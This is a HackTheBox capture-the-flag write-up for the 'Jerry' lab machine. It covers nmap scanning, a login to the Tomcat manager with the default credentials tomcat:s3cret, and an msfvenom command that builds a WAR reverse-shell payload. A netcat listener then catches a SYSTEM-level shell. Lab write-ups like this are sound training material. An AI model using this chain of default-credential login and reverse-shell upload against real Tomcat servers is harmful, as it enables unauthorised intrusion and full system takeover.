# HackTheBox
# Jerry - Writeup

---

## Initial Enumeration:
Running the first nmap scan on the first 1000 ports:
Since this is a Windows Box, we'll be running nmap with `-Pn` flag. 

```bash
nmap 10.10.10.95 -oN nmap/initial -Pn
```

```bash
# Nmap 7.80 scan initiated Fri Aug 27 05:35:49 2021 as: nmap -oN nmap/initial -Pn 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.100s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
```
Now, we can run 2 scans, one for the services enumeration and the other for all ports scan, since the all ports scan is going to take a long, i'm not going to run it on this box:
### Service enumeration:
```bash
nmap -sC -sV -p 8080 -oN nmap/port_8080_service 10.10.10.95 -Pn
```
```bash
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

Visiting the webserver, we can see that the server is running Apache Tomcat 7.0.88. Checking on searchsploit. We can see that we've got a rce upload bypass. I remember doing some boxes on [TryHackMe](https://tryhackme.com) that taught this kind of exploitation.
I ran a Nikto scan in the background and remembered that a `/manager` directory exists. So, I visited the directory and was greeted with a Popup for login. I made a list that contained default `username:passwords` for stuff that I had previously exploited. I saw that I had a few combos for the tomcat laying around, trying my luck and found a working set of credentials : `tomcat:s3cret`. So, I was able to log in. Now, since the upload bypass leading to RCE exists, I turned to msfvenom to generate a payload for me that would give me a reverse shell, checking my cheat sheet, I had the exact command lying around:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war > shell.war
```
Since, we've generated a reverse shell, we need to start a listener, for that I'll be using `netcat`. Once the listener is started and the file uploaded, we can simply just click on the name of the file we see on the dashboard of the website, in our case `/shell` and we'll get a reverse shell back:
```bash
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

---
